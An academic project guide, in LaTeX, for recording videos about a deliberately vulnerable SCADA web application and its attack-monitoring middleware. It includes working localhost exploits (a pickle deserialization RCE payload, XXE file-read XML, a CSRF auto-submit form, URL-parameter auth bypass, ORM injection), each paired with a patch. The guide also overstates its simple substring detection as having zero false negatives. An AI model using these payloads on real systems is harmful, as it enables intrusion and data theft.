\documentclass[12pt,a4paper]{article}
\usepackage[utf8]{inputenc}
\usepackage[turkish,english]{babel}
\usepackage{hyperref}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{geometry}
\usepackage{enumitem}
\usepackage{booktabs}

\geometry{margin=2.5cm}

\hypersetup{
    colorlinks=true,
    linkcolor=blue,
    filecolor=magenta,      
    urlcolor=cyan,
}

\lstset{
    basicstyle=\ttfamily\small,
    breaklines=true,
    frame=single,
    backgroundcolor=\color{gray!10}
}

\title{\textbf{Video Demonstration Guide}\\
\large Vulnerable SCADA Environment\\
Security Testing \& Monitoring System}

\author{Orhun Burak Kıyanç}
\date{\today}

\begin{document}

\maketitle
\tableofcontents
\newpage

% ============================================================
\section{Video Strategy: Single vs Multiple Videos}
% ============================================================

\subsection{Option A: Single Comprehensive Video (30-35 minutes)}

\subsubsection{Advantages}
\begin{itemize}[leftmargin=*]
    \item ✅ Complete narrative flow from start to finish
    \item ✅ Easier for viewers to watch entire project
    \item ✅ Only one video to upload/submit
    \item ✅ Shows project holistically
    \item ✅ Easier to maintain consistent audio/video quality
\end{itemize}

\subsubsection{Disadvantages}
\begin{itemize}[leftmargin=*]
    \item ❌ Long recording session = more exhausting
    \item ❌ One mistake near end = re-record everything
    \item ❌ Large file size (may have upload issues)
    \item ❌ Viewers may not watch full 30 minutes
    \item ❌ Harder to edit specific sections
\end{itemize}

\subsubsection{Recommended Structure}
\begin{enumerate}[leftmargin=*]
    \item \textbf{Introduction (2 min)} - Project overview
    \item \textbf{Monitoring System (8 min)} - Architecture + detection proof
    \item \textbf{Vulnerabilities 1-5 (10 min)} - Auth, Privilege, SQL, IDOR, XXE
    \item \textbf{Vulnerabilities 6-11 (10 min)} - Deserialization, File, Race, SSRF, Misconfig, CSRF
    \item \textbf{Conclusion (3 min)} - Summary + defense recommendations
\end{enumerate}

\subsection{Option B: Two Separate Videos (RECOMMENDED)}

\subsubsection{Advantages}
\begin{itemize}[leftmargin=*]
    \item ✅ \textbf{Meets professor requirements perfectly:}
    \begin{itemize}
        \item Video 1: Monitoring system explanation (required)
        \item Video 2: Vulnerability demonstrations
    \end{itemize}
    \item ✅ Easier to record in separate sessions
    \item ✅ Mistake in Video 1? Only re-record that part
    \item ✅ Smaller file sizes = faster uploads
    \item ✅ Can focus narration for each video's purpose
    \item ✅ Viewers can skip to specific content
\end{itemize}

\subsubsection{Disadvantages}
\begin{itemize}[leftmargin=*]
    \item ⚠️ Need to upload two videos
    \item ⚠️ May have some repeated introduction
    \item ⚠️ Need consistent setup between recordings
\end{itemize}

\subsubsection{Video 1: Monitoring System Deep Dive (12-15 minutes)}

\textbf{Purpose:} Address professor's requirement about monitoring system

\begin{enumerate}[leftmargin=*]
    \item \textbf{Introduction (2 min)}
    \begin{itemize}
        \item Project name and purpose
        \item Why monitoring is critical in SCADA
        \item What this video will cover
    \end{itemize}
    
    \item \textbf{System Architecture (4 min)}
    \begin{itemize}
        \item Show \texttt{monitoring/middleware.py} in VS Code
        \item Explain \texttt{AttackDetectionMiddleware} class
        \item Walk through detection patterns (connector=, is\_admin=, etc.)
        \item Show database schema (AttackLog table)
    \end{itemize}
    
    \item \textbf{Attack Detection \& Classification (4 min)}
    \begin{itemize}
        \item Execute 3 live attacks:
        \begin{enumerate}
            \item Authentication Bypass
            \item SQL Injection
            \item XXE
        \end{enumerate}
        \item Show monitoring dashboard at \texttt{/monitoring/}
        \item Highlight automatic attack type classification
        \item Display IP tracking, payload logging, timestamps
    \end{itemize}
    
    \item \textbf{Logging \& Response Mechanisms (3 min)}
    \begin{itemize}
        \item Show Docker logs with real-time alerts
        \item Query AttackLog table in Django shell
        \item Demonstrate SQLite database contents
        \item Explain how security team uses this data
    \end{itemize}
    
    \item \textbf{Proof of Correctness (2 min)}
    \begin{itemize}
        \item Execute attack on vulnerable endpoint → Success + Logged
        \item Execute same attack on patched endpoint → Blocked + Logged
        \item Show zero false negatives (all attacks detected)
        \item Show minimal false positives (normal traffic ignored)
    \end{itemize}
\end{enumerate}

\textbf{Tools Shown:}
\begin{itemize}
    \item VS Code (code walkthrough)
    \item Browser (monitoring dashboard)
    \item Terminal (Docker logs)
    \item Django shell (database queries)
    \item DB Browser for SQLite (visual database inspection)
\end{itemize}

\subsubsection{Video 2: Complete Vulnerability Exploitation (25-30 minutes)}

\textbf{Purpose:} Comprehensive security assessment demonstration

\begin{enumerate}[leftmargin=*]
    \item \textbf{Introduction (3 min)}
    \begin{itemize}
        \item Recap: SCADA security project
        \item List all 11 vulnerabilities
        \item Explain demonstration methodology
        \item Tools that will be used
    \end{itemize}
    
    \item \textbf{Vulnerability Demonstrations (20 min)}
    
    Each vulnerability gets approximately 1.5-2 minutes:
    
    \textbf{Format for each:}
    \begin{itemize}
        \item Show vulnerable code snippet (10 sec)
        \item Explain the flaw (20 sec)
        \item Execute exploit with tool (40 sec)
        \item Show successful result (20 sec)
        \item Quick comparison with patched version (15 sec)
        \item Confirm monitoring detected it (15 sec)
    \end{itemize}
    
    \textbf{Order (easy to hard):}
    \begin{enumerate}
        \item Security Misconfiguration (simple, warm-up)
        \item Authentication Bypass (URL manipulation)
        \item Privilege Escalation (session manipulation)
        \item IDOR (ID enumeration with Burp Intruder)
        \item SQL Injection ORM (filter bypass)
        \item CSRF + Authorization Bypass (combo attack)
        \item File Upload \& Overwrite (visual impact)
        \item XXE (file read demonstration)
        \item Race Condition (Python script)
        \item SSRF (internal network scan)
        \item Deserialization RCE (most complex, payload generation)
    \end{enumerate}
    
    \item \textbf{Tools Showcase (4 min)}
    \begin{itemize}
        \item Burp Suite Repeater workflow
        \item Burp Intruder for automation
        \item Python exploitation scripts
        \item cURL for command-line testing
        \item Docker container introspection
    \end{itemize}
    
    \item \textbf{Conclusion (3 min)}
    \begin{itemize}
        \item Summary of all 11 vulnerabilities
        \item Critical findings and severity
        \item Defense-in-depth importance
        \item Real-world SCADA security implications
        \item Why patched version is secure
    \end{itemize}
\end{enumerate}

\subsection{Option C: Multiple Short Videos (11+ videos)}

\subsubsection{Structure}
\begin{itemize}[leftmargin=*]
    \item Video 1: Monitoring System (10 min)
    \item Video 2: Authentication Bypass (2 min)
    \item Video 3: Privilege Escalation (2 min)
    \item Video 4: SQL Injection (3 min)
    \item Video 5-12: Remaining vulnerabilities (2 min each)
    \item Video 13: Conclusion (2 min)
\end{itemize}

\subsubsection{Advantages}
\begin{itemize}[leftmargin=*]
    \item ✅ Very easy to re-record specific sections
    \item ✅ Viewers can jump to specific vulnerabilities
    \item ✅ Small file sizes
    \item ✅ Can record across multiple days
\end{itemize}

\subsubsection{Disadvantages}
\begin{itemize}[leftmargin=*]
    \item ❌ 12+ videos to upload and manage
    \item ❌ Loses narrative flow
    \item ❌ Professor may not watch all
    \item ❌ Repetitive introductions
    \item ❌ NOT RECOMMENDED for academic submission
\end{itemize}

\subsection{FINAL RECOMMENDATION}

\begin{center}
\fbox{\parbox{0.9\textwidth}{
\textbf{OPTION B: Two Separate Videos}

\textbf{Video 1: Monitoring System (12-15 min)}\\
Focus on professor's requirement about monitoring design, detection, logging, and proof of correctness.

\textbf{Video 2: Vulnerability Exploitation (25-30 min)}\\
Complete demonstration of all 11 vulnerabilities with tools and techniques.

\textbf{Total Time: 37-45 minutes across 2 videos}

\textbf{Reason:} Perfect balance between:
\begin{itemize}[nosep]
    \item Meeting professor requirements explicitly
    \item Manageable recording sessions
    \item Easy error recovery (re-record only one video)
    \item Clear separation of concerns
    \item Professional presentation structure
\end{itemize}
}}
\end{center}

% ============================================================
\newpage
\section{Video 1: Monitoring System Demonstration}
% ============================================================

\subsection{Pre-Recording Checklist}

\subsubsection{Environment Setup}
\begin{lstlisting}[language=bash]
# Start Docker containers
cd scada_security_lab
docker compose up -d

# Verify running
docker compose ps

# Clear previous attack logs
docker compose exec web python manage.py shell
>>> from monitoring.models import AttackLog
>>> AttackLog.objects.all().delete()
>>> exit()

# Start fresh terminal session
clear
\end{lstlisting}

\subsubsection{Window Layout}
\begin{itemize}[leftmargin=*]
    \item \textbf{Left Half:} Browser with 3 tabs
    \begin{enumerate}
        \item Tab 1: \texttt{http://localhost:8000/vulnerable/login/}
        \item Tab 2: \texttt{http://localhost:8000/monitoring/}
        \item Tab 3: DB Browser for SQLite (\texttt{db.sqlite3})
    \end{enumerate}
    \item \textbf{Right Half:} Terminal split (Cmd+D in iTerm)
    \begin{enumerate}
        \item Top: Docker logs (\texttt{docker compose logs -f web})
        \item Bottom: Django shell / command execution
    \end{enumerate}
    \item \textbf{Bottom:} VS Code (minimize until needed for code walkthrough)
\end{itemize}

\subsection{Recording Script}

\subsubsection{Segment 1: Introduction (2 min)}

\begin{quote}
\textit{"Hello, this is the monitoring system demonstration for the Vulnerable SCADA Environment project. In this video, I'll show you how the monitoring system was designed and implemented, how attacks are detected and classified, how logging and response mechanisms work, and proof that the system operates correctly in practice."}

\textit{"SCADA systems control critical infrastructure like power grids and water treatment plants. Security monitoring is essential to detect and respond to cyber attacks. This project implements a comprehensive attack detection system using Django middleware."}

\textit{"Let's start by looking at the architecture."}
\end{quote}

\textbf{Actions:}
\begin{itemize}
    \item Show project directory structure
    \item Open VS Code
\end{itemize}

\subsubsection{Segment 2: System Architecture (4 min)}

\textbf{Code Walkthrough:} \texttt{monitoring/middleware.py}

\begin{quote}
\textit{"The monitoring system is built as Django middleware, which intercepts every HTTP request before it reaches the view. Let me show you the code."}
\end{quote}

\textbf{Show in VS Code:}
\begin{lstlisting}[language=Python]
class AttackDetectionMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response
    
    def __call__(self, request):
        # Detection patterns
        if 'connector=' in request.get_full_path():
            self.log_attack(request, 'SQL Injection')
        
        if 'is_admin=true' in request.get_full_path():
            self.log_attack(request, 'Authentication Bypass')
        
        # ... more patterns
        
        response = self.get_response(request)
        return response
\end{lstlisting}

\begin{quote}
\textit{"Here you can see the detection logic. The middleware examines the request path and parameters for suspicious patterns. For example:"}
\begin{itemize}
    \item \textit{"connector= indicates SQL injection attempts"}
    \item \textit{"is\_admin=true indicates authentication bypass"}
    \item \textit{"<!DOCTYPE with ENTITY indicates XXE attacks"}
\end{itemize}

\textit{"When a pattern matches, the log\_attack method is called, which creates an AttackLog entry in the database."}
\end{quote}

\textbf{Show Database Schema:}
\begin{lstlisting}[language=SQL]
CREATE TABLE monitoring_attacklog (
    id INTEGER PRIMARY KEY,
    timestamp DATETIME,
    ip_address VARCHAR(45),
    endpoint VARCHAR(200),
    attack_type VARCHAR(100),
    payload TEXT
);
\end{lstlisting}

\begin{quote}
\textit{"The AttackLog model stores five key pieces of information: timestamp, attacker's IP address, the endpoint they targeted, the classified attack type, and the payload they sent."}
\end{quote}

\subsubsection{Segment 3: Live Attack Detection (4 min)}

\begin{quote}
\textit{"Now let's see the system in action. I'll execute three different attacks and show how they're automatically detected and logged."}
\end{quote}

\textbf{Attack 1: Authentication Bypass}
\begin{lstlisting}[language=bash]
# In browser address bar
http://localhost:8000/vulnerable/login/?username=hacker&is_admin=true
\end{lstlisting}

\textbf{Actions:}
\begin{itemize}
    \item Execute attack
    \item Show successful login as admin
    \item Switch to monitoring tab
    \item Point to new log entry: "Authentication Bypass detected"
    \item Show Docker logs terminal: Real-time alert message
\end{itemize}

\begin{quote}
\textit{"Attack successfully executed. Notice the monitoring dashboard immediately logged this as an Authentication Bypass attack. The timestamp shows exactly when it occurred, and the payload contains the full malicious URL."}
\end{quote}

\textbf{Attack 2: SQL Injection}
\begin{lstlisting}[language=bash]
http://localhost:8000/vulnerable/dashboard/?connector=OR&name__icontains=NUCLEAR
\end{lstlisting}

\textbf{Actions:}
\begin{itemize}
    \item Execute attack (after admin login)
    \item Show 18-21 devices (NUCLEAR-CORE-CONTROLLER now visible!)
    \item Point to NUCLEAR device (red background, locked status)
    \item Refresh monitoring dashboard
    \item New entry: "SQL Injection"
    \item Docker logs show alert
\end{itemize}

\begin{quote}
\textit{"Second attack detected. The system recognized the connector parameter as a SQL injection attempt. Notice how NUCLEAR-CORE-CONTROLLER, which was hidden before, is now revealed with a red background indicating it's locked out. This demonstrates bypassing the security filter that hides critical infrastructure."}
\end{quote}

\textbf{Attack 3: XXE}
\begin{lstlisting}[language=xml]
<!-- Create xxe.xml -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data><content>&xxe;</content></data>
\end{lstlisting}

\textbf{Actions:}
\begin{itemize}
    \item Upload XXE file
    \item Show /etc/passwd content displayed
    \item Check monitoring dashboard
    \item New entry: "XXE Injection"
\end{itemize}

\begin{quote}
\textit{"Third attack: XXE injection. The monitoring system detected the malicious XML DOCTYPE and logged it with the full payload."}
\end{quote}

\subsubsection{Segment 4: Logging Mechanisms (3 min)}

\begin{quote}
\textit{"Let me show you the logging infrastructure in detail."}
\end{quote}

\textbf{Terminal - Django Shell:}
\begin{lstlisting}[language=Python]
docker compose exec web python manage.py shell

>>> from monitoring.models import AttackLog
>>> attacks = AttackLog.objects.all()
>>> attacks.count()
3

>>> for attack in attacks:
...     print(f"{attack.timestamp} - {attack.attack_type}")
...     print(f"IP: {attack.ip_address}")
...     print(f"Payload: {attack.payload[:50]}")
...     print("---")
\end{lstlisting}

\begin{quote}
\textit{"Using Django's ORM, we can query the attack logs programmatically. This shows all three attacks we just performed with full details."}
\end{quote}

\textbf{DB Browser for SQLite:}
\begin{itemize}
    \item Open \texttt{scada\_security\_lab/db.sqlite3}
    \item Navigate to \texttt{monitoring\_attacklog} table
    \item Show rows with all columns visible
    \item Sort by timestamp
\end{itemize}

\begin{quote}
\textit{"Here's the raw database view. Security teams can export this data for analysis, generate reports, or integrate with SIEM systems."}
\end{quote}

\textbf{Docker Logs:}
\begin{lstlisting}[language=bash]
docker compose logs web | grep "SECURITY ALERT"
\end{lstlisting}

\begin{quote}
\textit{"The system also provides real-time alerting through Docker logs, which can be forwarded to monitoring systems like Prometheus or Grafana."}
\end{quote}

\subsubsection{Segment 5: Proof of Correctness (2 min)}

\begin{quote}
\textit{"Now I'll prove the system operates correctly by comparing vulnerable and patched endpoints."}
\end{quote}

\textbf{Test 1: Vulnerable Endpoint}
\begin{lstlisting}[language=bash]
# Auth bypass on vulnerable endpoint
http://localhost:8000/vulnerable/login/?username=attacker&is_admin=true
\end{lstlisting}

\textbf{Result:}
\begin{itemize}
    \item ✅ Attack succeeds (logged in as admin)
    \item ✅ Monitoring logs the attack
\end{itemize}

\textbf{Test 2: Patched Endpoint}
\begin{lstlisting}[language=bash]
# Same attack on patched endpoint
http://localhost:8000/patched/login/?username=attacker&is_admin=true
\end{lstlisting}

\textbf{Result:}
\begin{itemize}
    \item ❌ Attack blocked (still on login page, not authenticated)
    \item ✅ Monitoring still logs the attempt
\end{itemize}

\begin{quote}
\textit{"This proves two critical points: First, the vulnerable endpoint has the flaw we claimed. Second, the monitoring system detects attacks regardless of whether they succeed or fail. This means zero false negatives - every attack attempt is logged."}
\end{quote}

\textbf{False Positive Test:}
\begin{lstlisting}[language=bash]
# Normal user navigation
http://localhost:8000/vulnerable/dashboard/
\end{lstlisting}

\begin{itemize}
    \item Navigate normally (no malicious parameters)
    \item Check monitoring dashboard
    \item No new entries
\end{itemize}

\begin{quote}
\textit{"Normal user activity doesn't trigger false alarms. The system only logs actual attack patterns."}
\end{quote}

\subsubsection{Segment 6: Conclusion (1 min)}

\begin{quote}
\textit{"In summary, this monitoring system successfully:"}
\begin{enumerate}
    \item \textit{"Detects 11 different attack types using pattern matching"}
    \item \textit{"Classifies attacks automatically with high accuracy"}
    \item \textit{"Logs all attempts with timestamps, IP addresses, and payloads"}
    \item \textit{"Provides real-time alerts through multiple channels"}
    \item \textit{"Operates correctly with zero false negatives and minimal false positives"}
\end{enumerate}

\textit{"This demonstrates a production-ready security monitoring system for SCADA environments. Thank you for watching."}
\end{quote}

% ============================================================
\newpage
\section{Video 2: Vulnerability Exploitation}
% ============================================================

\subsection{Pre-Recording Checklist}

\subsubsection{Tool Preparation}
\begin{lstlisting}[language=bash]
# Burp Suite
# Launch Burp Suite Community Edition
# Configure browser proxy: localhost:8080
# Turn intercept OFF initially

# cURL
curl --version

# Python
python3 --version

# Docker
docker compose ps  # All containers running

# Clear attack logs
docker compose exec web python manage.py shell
>>> from monitoring.models import AttackLog
>>> AttackLog.objects.all().delete()
>>> exit()
\end{lstlisting}

\subsubsection{Payload Files}
Create these files before recording:

\textbf{1. XXE Payload:} \texttt{xxe\_payload.xml}
\begin{lstlisting}[language=XML]
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<device><name>&xxe;</name></device>
\end{lstlisting}

\textbf{2. Deserialization Exploit:} \texttt{create\_rce\_payload.py}
\begin{lstlisting}[language=Python]
import pickle, base64, os

class RCEExploit:
    def __reduce__(self):
        return (os.system, ('touch /tmp/pwned.txt',))

payload = base64.b64encode(pickle.dumps(RCEExploit())).decode()
print(payload)
\end{lstlisting}

\textbf{3. Race Condition:} \texttt{race\_condition\_exploit.py}
\begin{lstlisting}[language=Python]
import requests, threading

def download(user_id):
    requests.get(f"http://localhost:8000/vulnerable/report/?id={user_id}")

threads = [threading.Thread(target=download, args=(i,)) for i in [1,2]]
for t in threads: t.start()
for t in threads: t.join()
\end{lstlisting}

\textbf{4. CSRF Attack:} \texttt{csrf\_exploit.html}
\begin{lstlisting}[language=HTML]
<html><body onload="document.forms[0].submit()">
<form method="POST" action="http://localhost:8000/vulnerable/assign/15/">
<input type="hidden" name="technician_name" value="Attacker">
<input type="hidden" name="action" value="Malicious Assignment">
</form></body></html>
\end{lstlisting}

\subsection{Recording Script - Each Vulnerability}

\subsubsection{Format Template}

For each vulnerability, follow this consistent structure:

\begin{enumerate}[leftmargin=*]
    \item \textbf{Code Display (10 sec)}
    \begin{itemize}
        \item Open VS Code to vulnerable code
        \item Highlight the vulnerable line(s)
        \item Quick read of the flaw
    \end{itemize}
    
    \item \textbf{Explanation (20 sec)}
    \begin{itemize}
        \item What the vulnerability is
        \item Why it's dangerous
        \item CWE classification
    \end{itemize}
    
    \item \textbf{Exploitation (40 sec)}
    \begin{itemize}
        \item Execute the attack with tool
        \item Show request/response
        \item Demonstrate successful exploitation
    \end{itemize}
    
    \item \textbf{Result Display (20 sec)}
    \begin{itemize}
        \item Show the impact (data leaked, RCE, etc.)
        \item Terminal output or file system changes
    \end{itemize}
    
    \item \textbf{Patched Comparison (15 sec)}
    \begin{itemize}
        \item Quick look at patched code
        \item "This prevents the attack by..."
    \end{itemize}
    
    \item \textbf{Monitoring Confirmation (15 sec)}
    \begin{itemize}
        \item Switch to monitoring dashboard
        \item Show the attack was logged
    \end{itemize}
\end{enumerate}

\textbf{Total per vulnerability: ~2 minutes}

\subsection{Introduction (3 min)}

\begin{quote}
\textit{"Welcome to the vulnerability exploitation demonstration for the Vulnerable SCADA Environment project. This is a comprehensive security assessment of a simulated SCADA system with intentionally vulnerable endpoints."}

\textit{"I've implemented 11 critical vulnerabilities covering the OWASP Top 10 and specific SCADA/ICS security issues. In this video, I'll demonstrate each vulnerability, show how to exploit it, and prove the patches are effective."}

\textit{"The vulnerabilities we'll cover are:"}
\begin{enumerate}
    \item \textit{Security Misconfiguration}
    \item \textit{Authentication Bypass}
    \item \textit{Privilege Escalation}
    \item \textit{IDOR}
    \item \textit{SQL Injection (ORM)}
    \item \textit{CSRF + Authorization Bypass}
    \item \textit{File Upload \& Overwrite}
    \item \textit{XXE}
    \item \textit{Race Condition}
    \item \textit{SSRF}
    \item \textit{Deserialization RCE}
\end{enumerate}

\textit{"Let's begin with the simplest vulnerability."}
\end{quote}

% ============================================================
\newpage
\subsection{Detailed Vulnerability Scripts}
% ============================================================

\subsubsection{1. Security Misconfiguration (2 min)}

\textbf{Code:} \texttt{settings.py}
\begin{lstlisting}[language=Python]
DEBUG = True  # Vulnerable in production
ALLOWED_HOSTS = ['*']  # Too permissive
\end{lstlisting}

\textbf{Narration:}
\begin{quote}
\textit{"Security misconfiguration occurs when DEBUG mode is enabled in production. This exposes sensitive information like database credentials, secret keys, and full stack traces."}
\end{quote}

\textbf{Exploit Steps:}
\begin{enumerate}
    \item Navigate to \texttt{http://localhost:8000/vulnerable/login/}
    \item Enter wrong credentials
    \item Django debug page appears (yellow page)
    \item Point out exposed information:
    \begin{itemize}
        \item \texttt{SECRET\_KEY}
        \item Database path
        \item Environment variables
        \item Full code paths
    \end{itemize}
\end{enumerate}

\textbf{Impact:}
\begin{quote}
\textit{"An attacker can use this information to craft more sophisticated attacks. The SECRET\_KEY can be used to forge session cookies."}
\end{quote}

\textbf{Patch:}
\begin{lstlisting}[language=Python]
DEBUG = False
ALLOWED_HOSTS = ['scada.example.com']
\end{lstlisting}

---

\subsubsection{2. Authentication Bypass (2 min)}

\textbf{Code:} \texttt{vulnerable/views.py} lines 43-68

\textbf{Narration:}
\begin{quote}
\textit{"Authentication bypass allows logging in without a password by manipulating URL parameters. The vulnerable code blindly updates user data with GET parameters."}
\end{quote}

\textbf{Tool:} Browser + Burp Suite

\textbf{Exploit Steps:}
\begin{enumerate}
    \item Normal login: \texttt{POST /vulnerable/login/} with username/password
    \item Intercept with Burp
    \item Change to: \texttt{GET /vulnerable/login/?username=hacker\&is\_admin=true}
    \item Forward request
    \item Logged in as admin without password!
\end{enumerate}

\textbf{Burp Repeater Demo:}
\begin{lstlisting}
GET /vulnerable/login/?username=attacker&is_admin=true HTTP/1.1
Host: localhost:8000
\end{lstlisting}

\textbf{Result:}
\begin{itemize}
    \item Response: 302 redirect to dashboard
    \item Dashboard shows "Welcome attacker (Admin)"
    \item Can toggle device maintenance status
\end{itemize}

\textbf{Patch:}
\begin{lstlisting}[language=Python]
# Only accept POST, use Django authentication
if request.method == "POST":
    user = authenticate(username=username, password=password)
    if user:
        login(request, user)
\end{lstlisting}

---

\subsubsection{3. Privilege Escalation (2 min)}

\textbf{Narration:}
\begin{quote}
\textit{"Even after proper login, a regular user can escalate privileges to admin by adding URL parameters to the dashboard."}
\end{quote}

\textbf{Exploit Steps:}
\begin{enumerate}
    \item Login as regular user: \texttt{user/user123}
    \item Dashboard shows "Welcome user (User)"
    \item Try to toggle maintenance → Modal blocks (Access Denied)
    \item Add to URL: \texttt{?is\_admin=true}
    \item Refresh page
    \item Now shows "Welcome user (Admin)"
    \item Toggle works!
\end{enumerate}

\textbf{Terminal verification:}
\begin{lstlisting}[language=bash]
docker compose logs web | grep "Privilege escalation"
# Output: DEBUG: Privilege escalation! User user gained admin rights...
\end{lstlisting}

\textbf{Patch:}
\begin{lstlisting}[language=Python]
# Get admin status from database only
is_admin = request.user.is_superuser
# Ignore URL parameters completely
\end{lstlisting}

---

\subsubsection{4. IDOR (2 min)}

\textbf{Tool:} Burp Suite Intruder

\textbf{Narration:}
\begin{quote}
\textit{"IDOR allows accessing other users' reports by simply changing the ID parameter. No authorization check exists."}
\end{quote}

\textbf{Exploit Steps:}
\begin{enumerate}
    \item Normal request: \texttt{GET /vulnerable/report/?id=1}
    \item Report #1 downloads (PDF)
    \item Send to Intruder
    \item Set position: \texttt{id=§1§}
    \item Payload: Numbers 1-100
    \item Start attack
    \item Filter responses: Status 200
    \item Result: 50+ reports accessible!
\end{enumerate}

\textbf{Show Downloaded Reports:}
\begin{itemize}
    \item \texttt{report\_1.pdf} - Technician: John Smith
    \item \texttt{report\_2.pdf} - Technician: Sarah Connor
    \item \texttt{report\_103.pdf} - Technician: Admin (confidential!)
\end{itemize}

\textbf{Patch:}
\begin{lstlisting}[language=Python]
if report.created_by != request.user:
    return HttpResponse("Forbidden", status=403)
\end{lstlisting}

---

\subsubsection{5. SQL Injection (ORM) (2 min)}

\textbf{Narration:}
\begin{quote}
\textit{"Django ORM injection occurs when user input controls the query logic connector. Even admin users cannot see NUCLEAR devices by default due to overly restrictive security policy. However, SQL injection can bypass this filter."}
\end{quote}

\textbf{Exploit Steps:}
\begin{enumerate}
    \item Login as admin (via auth bypass)
    \item Normal dashboard: 17-18 devices shown
    \item NUCLEAR device NOT visible (hidden even from admin)
    \item Add: \texttt{?connector=OR\&name\_\_icontains=NUCLEAR}
    \item Now 18-21 devices shown
    \item NUCLEAR-CORE-CONTROLLER appears (red background, locked status 🔒)
\end{enumerate}

\textbf{SQL Logic:}
\begin{lstlisting}[language=SQL]
-- Normal admin query (NUCLEAR hidden)
WHERE is_locked_out=False AND name NOT LIKE '%NUCLEAR%'  -- 17-18 results

-- Injected query (NUCLEAR revealed)
WHERE (is_locked_out=False AND name NOT LIKE '%NUCLEAR%') 
   OR name LIKE '%NUCLEAR%'  -- 18-21 results (NUCLEAR included!)
\end{lstlisting}

\textbf{Verification:}
\begin{lstlisting}[language=bash]
docker compose exec web python manage.py shell
>>> from core.models import Device
>>> Device.objects.filter(name__icontains='NUCLEAR')
<QuerySet [<Device: NUCLEAR-CORE-CONTROLLER>, ...]>
>>> # This device has is_locked_out=True and status='Maintenance'
\end{lstlisting}

\textbf{Key Point:}
\begin{quote}
\textit{"This vulnerability demonstrates two security failures: First, overly restrictive policies that hide critical info even from admins. Second, dynamic query building that allows filter bypass. In the patched version, admins have proper access to NUCLEAR devices without needing SQL injection."}
\end{quote}

---

\subsubsection{6. CSRF + Authorization Bypass (2 min)}

\textbf{Narration:}
\begin{quote}
\textit{"The maintenance interface has multiple vulnerabilities: client-side-only authorization check, no CSRF protection, and information disclosure. Regular users see a redirect popup, but can bypass it."}
\end{quote}

\textbf{Exploit Part 1: Client-Side Authorization Bypass}
\begin{enumerate}
    \item Login as regular user (user/user123)
    \item Navigate to \texttt{/vulnerable/maintenance/}
    \item Popup appears: "Access Restricted" with 3-second countdown
    \item Disable JavaScript in browser or use Burp Suite to intercept
    \item Maintenance page loads fully - authorization bypassed!
    \item All maintenance devices and logs visible (information disclosure)
\end{enumerate}

\textbf{Exploit Part 2: CSRF}
\begin{enumerate}
    \item Create \texttt{csrf\_exploit.html}
    \item Admin user is logged in (separate browser)
    \item Admin opens malicious HTML file
    \item Form auto-submits
    \item Technician assigned without admin's knowledge!
\end{enumerate}

\textbf{Verification:}
\begin{lstlisting}[language=bash]
curl http://localhost:8000/vulnerable/maintenance/
# Returns full page (no auth check!)

curl -X POST http://localhost:8000/vulnerable/assign/15/ \
  -d "technician_name=Attacker" \
  -b "sessionid=user_cookie"
# Success (no CSRF token required!)
\end{lstlisting}

\textbf{Patch:}
\begin{lstlisting}[language=Python]
# Remove @csrf_exempt
# Add admin check
def maintenance_interface(request):
    if not request.user.is_superuser:
        return HttpResponse("Forbidden", status=403)
\end{lstlisting}

---

\subsubsection{7. File Upload \& Overwrite (2 min)}

\textbf{Narration:}
\begin{quote}
\textit{"File upload accepts any file type and uses the original filename, allowing overwrites of critical system files."}
\end{quote}

\textbf{Exploit Steps:}
\begin{enumerate}
    \item Create \texttt{test.txt}: "ORIGINAL CONTENT"
    \item Upload to \texttt{/vulnerable/upload/}
    \item Success: "File uploaded successfully: test.txt"
    \item Download from \texttt{media/test.txt} → Shows "ORIGINAL"
    \item Create new \texttt{test.txt}: "MALICIOUS PAYLOAD"
    \item Upload again
    \item Download → Shows "MALICIOUS" (overwritten!)
\end{enumerate}

\textbf{File System Impact:}
\begin{lstlisting}[language=bash]
docker compose exec web ls -la /app/media/
# Shows test.txt with recent timestamp

docker compose exec web cat /app/media/test.txt
# Output: MALICIOUS PAYLOAD
\end{lstlisting}

\textbf{Real-World Scenario:}
\begin{quote}
\textit{"An attacker could upload diagnostic\_script.txt to overwrite legitimate SCADA scripts, causing operational disruption or injecting malicious code into automated processes."}
\end{quote}

\textbf{Patch:}
\begin{lstlisting}[language=Python]
import uuid
filename = f"{uuid.uuid4()}_{uploaded_file.name}"
# Whitelist extensions
if not filename.endswith(('.txt', '.xml')):
    return HttpResponse("Invalid file type", status=400)
\end{lstlisting}

---

\subsubsection{8. XXE (XML External Entity) (2 min)}

\textbf{Tool:} Manual XML file creation + Browser

\textbf{Narration:}
\begin{quote}
\textit{"XXE vulnerability allows reading local files through malicious XML entities. The lxml parser resolves external entities by default."}
\end{quote}

\textbf{Exploit Steps:}
\begin{enumerate}
    \item Create \texttt{xxe\_payload.xml}:
    \begin{lstlisting}[language=XML]
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<device><name>&xxe;</name></device>
    \end{lstlisting}
    \item Navigate to \texttt{/vulnerable/upload/}
    \item Upload \texttt{xxe\_payload.xml}
    \item Page displays parsed XML content
    \item Contents of \texttt{/etc/passwd} visible!
\end{enumerate}

\textbf{Result Display:}
\begin{lstlisting}
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
\end{lstlisting}

\textbf{Other Targets:}
\begin{itemize}
    \item \texttt{file:///etc/hostname} - Container hostname
    \item \texttt{file:///proc/self/environ} - Environment variables
    \item \texttt{file:///app/scada\_system/settings.py} - Django settings!
\end{itemize}

\textbf{Patch:}
\begin{lstlisting}[language=Python]
# Disable entity resolution
parser = etree.XMLParser(resolve_entities=False)
# OR use defusedxml library
from defusedxml import ElementTree
\end{lstlisting}

---

\subsubsection{9. Race Condition (2 min)}

\textbf{Tool:} Python script with threading

\textbf{Narration:}
\begin{quote}
\textit{"The report generation uses a static temp filename. Multiple simultaneous requests cause a race condition, where users may receive each other's reports."}
\end{quote}

\textbf{Exploit Script:}
\begin{lstlisting}[language=Python]
# race_condition_exploit.py
import requests, threading, time

def download_report(user_id, thread_id):
    url = f"http://localhost:8000/vulnerable/report/?id={user_id}"
    r = requests.get(url)
    with open(f"received_by_thread_{thread_id}.pdf", 'wb') as f:
        f.write(r.content)
